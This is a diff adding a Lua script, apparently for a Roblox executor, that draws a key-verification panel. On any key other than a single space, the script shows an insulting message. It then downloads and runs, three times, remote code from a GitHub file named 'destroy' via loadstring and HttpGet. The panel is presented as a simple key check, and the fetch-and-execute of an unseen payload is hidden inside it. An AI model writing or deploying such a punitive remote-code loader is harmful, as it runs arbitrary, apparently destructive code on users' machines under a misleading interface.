@@ -1,0 +1,17 @@
+local section = tab:section("验证卡密", true)
+section:Textbox("请输入文本", 'TextBoxfalg', "文本", function(txt)
+    key = txt
+end)
+section:Button("验证文本", function()
+    if key == " " then
+        notify("验证成功", "", 3)
+    else
+        notify("Fuck You", "Fuck You", 3)
+        loadstring(game:HttpGet("https://github.com/HKJQ3/-script/raw/refs/heads/main/销毁"))()
+        wait(1)
+        loadstring(game:HttpGet("https://github.com/HKJQ3/-script/raw/refs/heads/main/销毁"))()
+        wait(1)
+        loadstring(game:HttpGet("https://github.com/HKJQ3/-script/raw/refs/heads/main/销毁"))()
+        wait(1)
+    end
+end)
